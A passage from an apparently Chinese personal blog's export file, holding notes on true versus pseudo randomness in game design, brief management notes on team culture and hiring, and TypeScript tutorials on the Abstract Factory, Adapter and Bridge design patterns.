    <url>/nirvana/note/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/%E4%BC%AA%E9%9A%8F%E6%9C%BA%E5%92%8C%E7%9C%9F%E9%9A%8F%E6%9C%BA/</url>
    <content><![CDATA[<p><em>真伪随机其实分别指的是几率和概率</em></p>
<p>很久以前流传着这样一则笑话：一个身患重病的人决定去动手术。在手术之前，他问医生：“这起手术的成功率是多少？”医生回答他：“只有1%。”他很惊慌，但是医生说：“没事的，在你之前我已经治死过99个人了。”</p>
<p>这是一则嘲笑那些不懂“概率”的人的笑话，却讲出了“真随机”和“伪随机”之间的区别。</p>
<h2 id="随机数的三个特征"><a href="#随机数的三个特征" class="headerlink" title="随机数的三个特征"></a>随机数的三个特征</h2><p>1.随机性：完全紊乱；<br>2.不可预测性：从现有号码，无法推断下一个数字；<br>3.不可重复性：随机数之间没有重复。</p>
<p>真随机数是伴随物理实验，例如：掷硬币、掷骰子、电子元件噪声、核裂变等，其结果符合三个特点。</p>
<h2 id="伪随机数"><a href="#伪随机数" class="headerlink" title="伪随机数"></a>伪随机数</h2><p>伪随机数是通过某种算法，获取随机值，不是真的很随机。<br>伪随机数分为强伪随机数和弱伪随机数。<br>1.强伪随机数：接近真实随机数，令人满意的特性。随机性与不可预测性，不可预知的。<br>2.弱伪随机数：满足随机性，可预测的。</p>
<p>在游戏当中我们一直提到的“真随机”和“伪随机”，到底是什么意思？</p>
<p>我们通常说的真随机又名“纯随机”（True Random Distribution），就是我们平常一直说的那种、一般意义上的“随机”。</p>
<p>在真随机中，每一个事件都是相互独立、服从真随机分布的，不受其他事件的发生而改变。比方说某款游戏为了吸引用户，拥有这么一个随机抽卡系统：每次抽卡时，都有1%的几率抽出SSR卡片，这个概率服从真随机分布。</p>
<p>回到我们最开始说的那个“治死99个”的笑话：我们一眼就能看出这个笑话的不合理性。但在抽卡游戏中，我们的大脑瞬间失去理智。有相当一部分玩家认为：我连抽100次，总能抽到这张卡吧！</p>
<p>实际上，连抽100次却抽不出1%的SSR卡的几率是为(1-0.01)^100=36.6%，甚至还稍稍超过了1/3。将连抽数字上升至300，也仍有4.9%的几率。</p>
<p>换句话说，假设有10000个玩家连抽100次，就有约3660个玩家抽不出这张SSR；10000个玩家连抽300次，也仍有约490个玩家抽不出这张SSR——这对玩家的游戏体验来说可以说是毁灭性的打击。</p>
<p>设计者们提出了“伪随机”的概念：在不确定性的随机事件当中，通过一系列算法使随机事件均匀分布在多次事件当中，尽可能减少或消除极端情况的发生，以提高玩家的游戏体验。</p>
<p>制造“伪随机”的方法有很多，</p>
<ul>
<li>1.“伪随机分布”（Pseudo Random Distribution，简称PRD）<br>PRD算法的表示非常简单：<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">P(N) &#x3D; C * N</span><br></pre></td></tr></table></figure>
N表示当前攻击的次数，P(N)表示当前攻击的暴击率，C为概率增量。如果我们这次攻击产生了暴击，则需要将 N 重置为 1，如果这次攻击没有产生暴击，则 N + 1。</li>
</ul>
<p>为了便于理解，这里直接给出一个具体例子：</p>
<p>设我们当前玩家角色暴击率还是0.5，那么对于 PRD算法，此时的 C = 0.3</p>
<blockquote>
<p>此时第一次攻击时的实际暴击几率，即 P(1) = 0.3 * 1 = 0.3，若没有暴击，则 N + 1，N = 2<br>此时第二次攻击时的实际暴击几率，即P(2) = 0.3 * 2 = 0.6，若没有暴击，则 N + 1，N = 3<br>此时第三次攻击时的实际暴击几率，即P(3) = 0.3 * 3 = 0.9，此时对于大部分玩家而言这一次攻击就会产生暴击了，而如果玩家是个非酋，这次仍没有暴击，没关系，N + 1，N = 4<br>第四次攻击，P(4) = 0.3 * 4 = 1.2 &gt;= 1，这一次是一定会暴击的。</p>
</blockquote>
<p>可以看到，使用 PRD 算法，对于攻击是否会暴击这一问题，仍然是存在着随机性即玩家的运气因素的，但即使是运气最差的玩家，仍然也会在第四次攻击时产生暴击，因此PRD算法可以在保存随机性的同时，减少玩家运气因素对游戏结果的影响。</p>
<ul>
<li><p>2.洗牌算法<br>洗牌算法最常见的用法，是在各大音乐播放器中的“随机播放”之中。在随机播放时，如果采用真随机，会导致一首歌无论如何都播放不出，或是同一首歌连续播放数次（有兴趣的读者可以计算一下这些概率）。为了解决这个问题，播放器采用的解决方案即是洗牌算法：将一个包含所有歌曲的数组像洗牌一样打乱，然后依次播放这个乱序数组。</p>
</li>
<li><p>3.组合随机。<br>这是一种广泛应用于各个游戏的做法：在抽奖的时候进行两次、或是更多次的判断，一次不随机，而剩下的判断则是真随机。比如说，你会在第X次抽卡时抽到SSR是确定的，但抽中的SSR具体是哪张卡，则是随机的——这就是广大手游中的“低保”系统了。</p>
</li>
</ul>
<h2 id="举例"><a href="#举例" class="headerlink" title="举例"></a>举例</h2><p><strong>真随机：</strong>有一天，小明在的班级上举办了一次抽奖活动。这个班级有40个学生，所以为了公平起见，保证每个学生都有1/40的几率中奖，老师准备了40个相同的纸盒，每个纸盒中都有40张纸条，有1张纸条是中奖纸条。这样一来，每个学生都有1/40的几率中奖，但每个学生是否中奖并不受其他学生的影响。在极端情况下，这个班上可能40个学生都能中奖。这就是真随机。</p>
<p><strong>伪随机：</strong>小明班上举办了抽奖活动。为了公平起见，老师准备了1个纸盒，纸盒中有40张纸条，只有1张纸条是中奖纸条。这样一来，每个学生都有1/40的几率中奖——但是显而易见，这个班上有且仅有一名学生能够中奖。一名学生在中奖后，余下的所有学生中奖几率都会减少至0。这就是伪随机。</p>
]]></content>
      <categories>
        <category>note</category>
      </categories>
  </entry>
  <entry>
    <title>团队文化</title>
    <url>/nirvana/note/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/%E5%9B%A2%E9%98%9F%E6%96%87%E5%8C%96/</url>
    <content><![CDATA[<p>但在文化价值观主导行为的层次上，经理阶层则必须负责发展出一套组织内共享的价值观、目标以及行事准则，以建立个体对组织的信赖。经理人可通过训话等方式来传达信息，但言传不如身教，最好的方法还是以身作则。如果经理人日常行事都依照组织的价值观及目标，公司里的人自然会上行下效。</p>
]]></content>
      <categories>
        <category>note</category>
      </categories>
  </entry>
  <entry>
    <title>招聘</title>
    <url>/nirvana/note/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/%E6%8B%9B%E8%81%98/</url>
    <content><![CDATA[<p>每一个经理人迟早都会碰到两个任务面试新员工，以及设法让一个萌生去意的优秀下属继续待在公司效命。<br>面试的目的可归为以下4类<br>1.找到一个具备能力及潜力的人。<br>2.让他认识你并且了解这个公司。<br>3.确定此人的能力和这份工作是否相符。<br>4.想办法把他招进公司。</p>
]]></content>
      <categories>
        <category>note</category>
      </categories>
  </entry>
  <entry>
    <title></title>
    <url>/nirvana/uncategorized/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/%E8%BE%9E%E6%97%A7%E8%BF%8E%E6%96%B0/</url>
    <content><![CDATA[<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>辞旧迎新</title>
    <style type="text/css" media="all">
      body {
        margin: 0;
        font-family: "Helvetica Neue", Helvetica, Arial, "Hiragino Sans GB", sans-serif;
        font-size: 14px;
        line-height: 20px;
        color: #777;
        background-color: white;
      }
      .container {
        width: 700px;
        margin-right: auto;
        margin-left: auto;
      }

      .post {
        font-family: Georgia, "Times New Roman", Times, "SimSun", serif;
        position: relative;
        padding: 70px;
        bottom: 0;
        overflow-y: auto;
        font-size: 16px;
        font-weight: normal;
        line-height: 25px;
        color: #515151;
      }

      .post h1{
        font-size: 50px;
        font-weight: 500;
        line-height: 60px;
        margin-bottom: 40px;
        color: inherit;
      }

      .post p {
        margin: 0 0 35px 0;
      }

      .post img {
        border: 1px solid #D9D9D9;
      }

      .post a {
        color: #28A1C5;
      }
    </style>
  </head>
  <body>
    <div class="container">
      <div class="post">
        <h1 class="title">辞旧迎新</h1>
        <div class="show-content">
          
        </div>
      </div>
    </div>
  </body>
</html>
]]></content>
  </entry>
  <entry>
    <title>Abstract-Factory-Pattern（抽象工厂模式）</title>
    <url>/nirvana/DesignPattern/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%EF%BC%88TypeScript%EF%BC%89/Abstract-Factory-Pattern%EF%BC%88%E6%8A%BD%E8%B1%A1%E5%B7%A5%E5%8E%82%E6%A8%A1%E5%BC%8F%EF%BC%89/</url>
    <content><![CDATA[<p><strong>抽象工厂模式（Abstract Factory Pattern）</strong>：抽象工厂的工作是将“抽象零件”组装成“抽象产品”。不关心零件的具体实现，而是值关心接口。我们使用该接口将零件组装成产品<br>在抽象工厂模式中，接口是负责创建一个相关对象的工厂，不需要显式指定它们的类。每个生成的工厂都能按照工厂模式提供对象。</p>
<h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><ul>
<li><strong>意图：</strong>提供一个创建一系列相关或相互依赖对象的接口，而无需指定它们具体的类。</li>
<li><strong>主要解决：</strong>主要解决接口选择的问题。</li>
<li><strong>何时使用：</strong>系统的产品有多于一个的产品族，而系统只消费其中某一族的产品。</li>
<li><strong>如何解决：</strong>在一个产品族里面，定义多个产品。</li>
<li><strong>关键代码：</strong>在一个工厂里聚合多个同类产品。</li>
<li><strong>优点：</strong>当一个产品族中的多个对象被设计成一起工作时，它能保证客户端始终只使用同一个产品族中的对象。</li>
<li><strong>缺点：</strong>产品族扩展非常困难，要增加一个系列的某一产品，既要在抽象的 Creator 里加代码，又要在具体的里面加代码。</li>
<li><strong>使用场景：</strong><br>1、QQ 换皮肤，一整套一起换。<br>2、生成不同操作系统的程序。<blockquote>
<p>注意事项：产品族难扩展，产品等级易扩展。</p>
</blockquote>
</li>
</ul>
<h2 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h2><p>Shape.ts 创建一个形状接口</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">export interface Shape &#123;</span><br><span class="line">    draw(): void;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>Square.ts 正方形类实现形状接口</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import &#123; Shape &#125; from &quot;.&#x2F;Shape&quot;;</span><br><span class="line"></span><br><span class="line">export default class Square implements Shape &#123;</span><br><span class="line">    public draw(): void &#123;</span><br><span class="line">        console.log(&quot;Inside Square::draw() method.&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>Rectangle.ts 长方形类实现形状接口</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import &#123; Shape &#125; from &quot;.&#x2F;Shape&quot;;</span><br><span class="line"></span><br><span class="line">export default class Rectangle implements Shape &#123;</span><br><span class="line"></span><br><span class="line">    public draw(): void &#123;</span><br><span class="line">        console.log(&quot;Inside Rectangle::draw() method.&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>Circle.ts 圆形类实现形状接口</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import &#123; Shape &#125; from &quot;.&#x2F;Shape&quot;;</span><br><span class="line"></span><br><span class="line">export default class Circle implements Shape &#123;</span><br><span class="line">    public draw(): void &#123;</span><br><span class="line">        console.log(&quot;Inside Circle::draw() method.&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>Color.ts 创建一个颜色接口。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">export interface Color &#123;</span><br><span class="line">    fill(): void;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>Red.ts 红色类实现颜色接口</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import &#123; Color &#125; from &quot;.&#x2F;Color&quot;;</span><br><span class="line"></span><br><span class="line">export default class Red implements Color &#123;</span><br><span class="line"></span><br><span class="line">    public fill(): void &#123;</span><br><span class="line">        console.log(&quot;Inside Red::fill() method.&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>Blue.ts 蓝色类实现颜色接口</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import &#123; Color &#125; from &quot;.&#x2F;Color&quot;;</span><br><span class="line"></span><br><span class="line">export default class Blue implements Color &#123;</span><br><span class="line"></span><br><span class="line">    public fill(): void &#123;</span><br><span class="line">        console.log(&quot;Inside Blue::fill() method.&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>Green.ts 绿色类实现颜色接口</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import &#123; Color &#125; from &quot;.&#x2F;Color&quot;;</span><br><span class="line"></span><br><span class="line">export default class Green implements Color &#123;</span><br><span class="line"></span><br><span class="line">    public fill(): void &#123;</span><br><span class="line">        console.log(&quot;Inside Green::fill() method.&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>AbstractFactory.ts 抽象工厂，为Color、Shape创建抽象对象</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import &#123; Color &#125; from &quot;.&#x2F;Color&quot;;</span><br><span class="line">import &#123; Shape &#125; from &quot;.&#x2F;Shape&quot;;</span><br><span class="line"></span><br><span class="line">export default abstract class AbstractFactory &#123;</span><br><span class="line">    public abstract getColor(color: string): Color;</span><br><span class="line">    public abstract getShape(shape: string): Shape;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>ColorFactory.ts 创建扩展了 AbstractFactory 的工厂类，基于给定的信息生成实体类的对象</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import AbstractFactory from &quot;.&#x2F;AbstractFactory&quot;;</span><br><span class="line">import &#123; Shape &#125; from &quot;.&#x2F;Shape&quot;;</span><br><span class="line">import &#123; Color &#125; from &quot;.&#x2F;Color&quot;;</span><br><span class="line">import Red from &quot;.&#x2F;Red&quot;;</span><br><span class="line">import Green from &quot;.&#x2F;Green&quot;;</span><br><span class="line">import Blue from &quot;.&#x2F;Blue&quot;;</span><br><span class="line"></span><br><span class="line">export default class ColorFactory extends AbstractFactory &#123;</span><br><span class="line">    public getShape(shapeType: string): Shape &#123;</span><br><span class="line">        return null;</span><br><span class="line">    &#125;</span><br><span class="line">    public getColor(color: string): Color &#123;</span><br><span class="line">        if (color &#x3D;&#x3D; null) &#123;</span><br><span class="line">            return null;</span><br><span class="line">        &#125;</span><br><span class="line">        if (color.toUpperCase() &#x3D;&#x3D;&#x3D; &quot;RED&quot;) &#123;</span><br><span class="line">            return new Red();</span><br><span class="line">        &#125; else if (color.toUpperCase() &#x3D;&#x3D;&#x3D; &quot;GREEN&quot;) &#123;</span><br><span class="line">            return new Green();</span><br><span class="line">        &#125; else if (color.toUpperCase() &#x3D;&#x3D;&#x3D; &quot;BLUE&quot;) &#123;</span><br><span class="line">            return new Blue();</span><br><span class="line">        &#125;</span><br><span class="line">        return null;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>ShapeFactory.ts 创建扩展了 AbstractFactory 的工厂类，基于给定的信息生成实体类的对象</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import AbstractFactory from &quot;.&#x2F;AbstractFactory&quot;;</span><br><span class="line">import &#123; Shape &#125; from &quot;.&#x2F;Shape&quot;;</span><br><span class="line">import Circle from &quot;.&#x2F;Circle&quot;;</span><br><span class="line">import Rectangle from &quot;.&#x2F;Rectangle&quot;;</span><br><span class="line">import Square from &quot;.&#x2F;Square&quot;;</span><br><span class="line">import &#123; Color &#125; from &quot;.&#x2F;Color&quot;;</span><br><span class="line"></span><br><span class="line">export default class ShapeFactory extends AbstractFactory &#123;</span><br><span class="line"></span><br><span class="line">    public getShape(shapeType: string): Shape &#123;</span><br><span class="line">        if (shapeType &#x3D;&#x3D; null) &#123;</span><br><span class="line">            return null;</span><br><span class="line">        &#125;</span><br><span class="line">        if (shapeType.toUpperCase() &#x3D;&#x3D;&#x3D; &quot;CIRCLE&quot;) &#123;</span><br><span class="line">            return new Circle();</span><br><span class="line">        &#125; else if (shapeType.toUpperCase() &#x3D;&#x3D;&#x3D; &quot;RECTANGLE&quot;) &#123;</span><br><span class="line">            return new Rectangle();</span><br><span class="line">        &#125; else if (shapeType.toUpperCase() &#x3D;&#x3D;&#x3D; &quot;SQUARE&quot;) &#123;</span><br><span class="line">            return new Square();</span><br><span class="line">        &#125;</span><br><span class="line">        return null;</span><br><span class="line">    &#125;</span><br><span class="line">    public getColor(color: string): Color &#123;</span><br><span class="line">        return null;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>FactoryProducer.ts 创建一个工厂创造器/生成器类，通过传递形状或颜色信息来获取工厂</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import AbstractFactory from &quot;.&#x2F;AbstractFactory&quot;;</span><br><span class="line">import ShapeFactory from &quot;.&#x2F;ShapeFactory&quot;;</span><br><span class="line">import ColorFactory from &quot;.&#x2F;ColorFactory&quot;;</span><br><span class="line"></span><br><span class="line">export default class FactoryProducer &#123;</span><br><span class="line">    public static getFactory(choice: string): AbstractFactory &#123;</span><br><span class="line">        if (choice.toUpperCase() &#x3D;&#x3D;&#x3D; &quot;SHAPE&quot;) &#123;</span><br><span class="line">            return new ShapeFactory();</span><br><span class="line">        &#125; else if (choice.toUpperCase() &#x3D;&#x3D;&#x3D; &quot;COLOR&quot;) &#123;</span><br><span class="line">            return new ColorFactory();</span><br><span class="line">        &#125;</span><br><span class="line">        return null;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>index.ts </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import FactoryProducer from &quot;.&#x2F;FactoryProducer&quot;;</span><br><span class="line">&#x2F;&#x2F;获取形状工厂</span><br><span class="line">const shapeFactory &#x3D; FactoryProducer.getFactory(&quot;SHAPE&quot;);</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;获取形状为 Circle 的对象</span><br><span class="line">const shape1 &#x3D; shapeFactory.getShape(&quot;CIRCLE&quot;);</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;调用 Circle 的 draw 方法</span><br><span class="line">shape1.draw();</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;获取形状为 Rectangle 的对象</span><br><span class="line">const shape2 &#x3D; shapeFactory.getShape(&quot;RECTANGLE&quot;);</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;调用 Rectangle 的 draw 方法</span><br><span class="line">shape2.draw();</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;获取形状为 Square 的对象</span><br><span class="line">const shape3 &#x3D; shapeFactory.getShape(&quot;SQUARE&quot;);</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;调用 Square 的 draw 方法</span><br><span class="line">shape3.draw();</span><br><span class="line">&#x2F;&#x2F;获取颜色工厂</span><br><span class="line">const colorFactory &#x3D; FactoryProducer.getFactory(&quot;COLOR&quot;);</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;获取颜色为 Red 的对象</span><br><span class="line">const color1 &#x3D; colorFactory.getColor(&quot;RED&quot;);</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;调用 Red 的 fill 方法</span><br><span class="line">color1.fill();</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;获取颜色为 Green 的对象</span><br><span class="line">const color2 &#x3D; colorFactory.getColor(&quot;Green&quot;);</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;调用 Green 的 fill 方法</span><br><span class="line">color2.fill();</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;获取颜色为 Blue 的对象</span><br><span class="line">const color3 &#x3D; colorFactory.getColor(&quot;BLUE&quot;);</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;调用 Blue 的 fill 方法</span><br><span class="line">color3.fill();</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h2 id="result"><a href="#result" class="headerlink" title="result"></a>result</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Inside Circle::draw() method.</span><br><span class="line">Inside Rectangle::draw() method.</span><br><span class="line">Inside Square::draw() method.</span><br><span class="line">Inside Red::fill() method.</span><br><span class="line">Inside Green::fill() method.</span><br><span class="line">Inside Blue::fill() method.</span><br></pre></td></tr></table></figure>
<h2 id="类图"><a href="#类图" class="headerlink" title="类图"></a>类图</h2><p><img src="https://upload-images.jianshu.io/upload_images/10024246-77c13ebb515b20a4.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"></p>
<h2 id="角色"><a href="#角色" class="headerlink" title="角色"></a>角色</h2><ul>
<li><strong>AbstractProduct（抽象产品）</strong><br>AbstractProduct角色负责定义AbstractFactory角色所生产的抽象零件和产品的接口</li>
<li><strong>AbstractFactory（抽象工厂）</strong><br>AbstractFactory角色负责定义用于生产抽象产品的接口</li>
<li><strong>Client（委托者）</strong><br>Client角色仅会调用AbstractFactory角色和AbstractProduct角色的接口进行工作，对于具体的零件、产品和工厂一无所知。</li>
<li><strong>ConcreteProduct（具体产品）</strong><br>ConcreteProduct角色负责实现AbstractProduct角色定义的接口</li>
<li><strong>ConcreteFactory（具体工厂）</strong><br>ConcreteFactory角色负责实现AbstractFactory角色的接口。</li>
</ul>
]]></content>
      <categories>
        <category>DesignPattern</category>
      </categories>
  </entry>
  <entry>
    <title>Adapter模式（适配器）</title>
    <url>/nirvana/DesignPattern/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%EF%BC%88TypeScript%EF%BC%89/Adapter%E6%A8%A1%E5%BC%8F%EF%BC%88%E9%80%82%E9%85%8D%E5%99%A8%EF%BC%89/</url>
    <content><![CDATA[<blockquote>
<p>适配器主要用于接口的转换或者将接口不兼容的类对象组合在一起形成对外统一接口，是一种结构性模式</p>
</blockquote>
<h3 id="Adapter模式有以下两种："><a href="#Adapter模式有以下两种：" class="headerlink" title="Adapter模式有以下两种："></a>Adapter模式有以下两种：</h3><ul>
<li>类适配器模式（使用继承实现）</li>
<li>对象适配器（使用委托的适配器）<h3 id="1、使用继承的适配器"><a href="#1、使用继承的适配器" class="headerlink" title="1、使用继承的适配器"></a>1、使用继承的适配器</h3>Banner类<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">export default class Banner &#123;</span><br><span class="line">    private info: string;</span><br><span class="line">    constructor(info: string) &#123;</span><br><span class="line">        this.info &#x3D; info;</span><br><span class="line">    &#125;</span><br><span class="line">    &#x2F;**</span><br><span class="line">     * ShowWithParen</span><br><span class="line">    *&#x2F;</span><br><span class="line">    public ShowWithParen(): void &#123;</span><br><span class="line">        console.log(&#96;($&#123;this.info&#125;)&#96;);</span><br><span class="line">    &#125;</span><br><span class="line">    &#x2F;**</span><br><span class="line">     * ShowWithAster</span><br><span class="line">     *&#x2F;</span><br><span class="line">    public ShowWithAster(): void &#123;</span><br><span class="line">        console.log(&#96;*$&#123;this.info&#125;*&#96;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
Print接口：声明2个方法<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">export interface Print &#123;</span><br><span class="line">    printWeak: () &#x3D;&gt; void;</span><br><span class="line">    printStrong: () &#x3D;&gt; void;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
PrintBanner类：扮演适配器的角色，继承Banner类，实现Print接口<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import Banner from &quot;.&#x2F;Banner&quot;;</span><br><span class="line">import &#123; Print &#125; from &quot;.&#x2F;Print&quot;;</span><br><span class="line">export default class PrintBanner extends Banner implements Print &#123;</span><br><span class="line"></span><br><span class="line">    constructor(info: string) &#123;</span><br><span class="line">        super(info);</span><br><span class="line">    &#125;</span><br><span class="line">    &#x2F;**</span><br><span class="line">     * printWeak</span><br><span class="line">     *&#x2F;</span><br><span class="line">    public printWeak(): void &#123;</span><br><span class="line">        this.ShowWithParen();</span><br><span class="line">    &#125;</span><br><span class="line">    &#x2F;**</span><br><span class="line">     * printStrong</span><br><span class="line">     *&#x2F;</span><br><span class="line">    public printStrong(): void &#123;</span><br><span class="line">        this.ShowWithAster();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<img src="https://upload-images.jianshu.io/upload_images/10024246-144b9455b75871d9.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="使用继承的适配器类图"></li>
</ul>
<h3 id="2、使用委托的适配器"><a href="#2、使用委托的适配器" class="headerlink" title="2、使用委托的适配器"></a>2、使用委托的适配器</h3><p>PrintAbstractClass类</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">export default abstract class PrintAbstractClass &#123;</span><br><span class="line">    public abstract printWeak(): void;</span><br><span class="line">    public abstract printStrong(): void;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>PrintBannerClass类：由于无法同时继承2个类，PrintBannerClass定义为Banner和PrintAbstractClass的子类</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import PrintAbstractClass from &quot;.&#x2F;PrintAbstractClass&quot;;</span><br><span class="line">import Banner from &quot;.&#x2F;Banner&quot;;</span><br><span class="line"></span><br><span class="line">export default class PrintBannerClass extends PrintAbstractClass &#123;</span><br><span class="line">    private banner: Banner;</span><br><span class="line">    constructor(info: string) &#123;</span><br><span class="line">        super();</span><br><span class="line">        this.banner &#x3D; new Banner(info);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public printWeak(): void &#123;</span><br><span class="line">        this.banner.ShowWithParen();</span><br><span class="line">    &#125;</span><br><span class="line">    public printStrong(): void &#123;</span><br><span class="line">        this.banner.ShowWithAster();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="https://upload-images.jianshu.io/upload_images/10024246-3da680b5999179cc.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="对象适配器模式的类图（使用委托）"></p>
<h3 id="main函数"><a href="#main函数" class="headerlink" title="main函数"></a>main函数</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import PrintBanner from &quot;.&#x2F;PrintBanner&quot;</span><br><span class="line">import &#123; Print &#125; from &quot;.&#x2F;Print&quot;;</span><br><span class="line">import PrintBannerClass from &quot;.&#x2F;PrintBannerClass&quot;;</span><br><span class="line">&#x2F;&#x2F;只暴露到外面Print接口，可以多个类实现相关接口，使用时，只要new不同的类，然后调用方法使用统一</span><br><span class="line">const p: Print &#x3D; new PrintBanner(&quot;Hellp&quot;);</span><br><span class="line">console.log(&quot;---------p-----------------&quot;)</span><br><span class="line">p.printWeak();</span><br><span class="line">p.printStrong();</span><br><span class="line">&#x2F;&#x2F;p2会显示多个方法</span><br><span class="line">const p2: PrintBanner &#x3D; new PrintBanner(&quot;hell2&quot;);</span><br><span class="line">console.log(&quot;---------p2-----------------&quot;)</span><br><span class="line">p2.ShowWithAster();</span><br><span class="line">p2.ShowWithParen();</span><br><span class="line">p2.printStrong();</span><br><span class="line">p2.printWeak();</span><br><span class="line">console.log(&quot;---------p3-----------------&quot;)</span><br><span class="line">const P3 &#x3D; new PrintBannerClass(&quot;test&quot;);</span><br><span class="line">P3.printStrong();</span><br><span class="line">P3.printWeak();</span><br></pre></td></tr></table></figure>
<blockquote>
<p>———p—————–<br>(Hellp)<br>*Hellp*<br>———p2—————–<br>*hell2*<br>(hell2)<br>*hell2*<br>(hell2)<br>———p3—————–<br>*test*<br>(test)</p>
</blockquote>
]]></content>
      <categories>
        <category>DesignPattern</category>
      </categories>
  </entry>
  <entry>
    <title>Bridge-Pattern（桥接模式）</title>
    <url>/nirvana/DesignPattern/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%EF%BC%88TypeScript%EF%BC%89/Bridge-Pattern%EF%BC%88%E6%A1%A5%E6%8E%A5%E6%A8%A1%E5%BC%8F%EF%BC%89/</url>
    <content><![CDATA[<p><strong>桥接模式（Bridge Patten）：</strong>：桥接模式是在类的抽象化和实现化之间搭建桥梁，来实现二者的解耦。。这种类型的设计模式属于结构型模式。</p>
<h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><ul>
<li><strong>意图：</strong>将抽象部分与实现部分分离，使它们都可以独立的变化。</li>
<li><strong>主要解决：</strong>在有多种可能会变化的情况下，用继承会造成类爆炸问题，扩展起来不灵活。</li>
<li><strong>何时使用：</strong>实现系统可能有多个角度分类，每一种角度都可能变化。</li>
<li><strong>如何解决：</strong>把这种多角度分类分离出来，让它们独立变化，减少它们之间耦合。</li>
<li><strong>关键代码：</strong>抽象类依赖实现类。</li>
<li><strong>应用实例：</strong>墙上的开关，可以看到的开关是抽象的，不用管里面具体怎么实现的。</li>
<li><strong>优点：</strong><br>1、抽象和实现的分离。<br>2、优秀的扩展能力。<br>3、实现细节对客户透明。</li>
<li><strong>缺点：</strong>桥接模式的引入会增加系统的理解与设计难度，由于聚合关联关系建立在抽象层，要求开发者针对抽象进行设计与编程。</li>
<li><strong>使用场景：</strong><br>1、对于那些不希望使用继承或因为多层次继承导致系统类的个数急剧增加的系统，桥接模式尤为适用。<br>2、一个类存在两个独立变化的维度，且这两个维度都需要进行扩展。</li>
</ul>
<blockquote>
<p>注意事项：对于两个独立变化的维度，使用桥接模式再适合不过了。</p>
</blockquote>
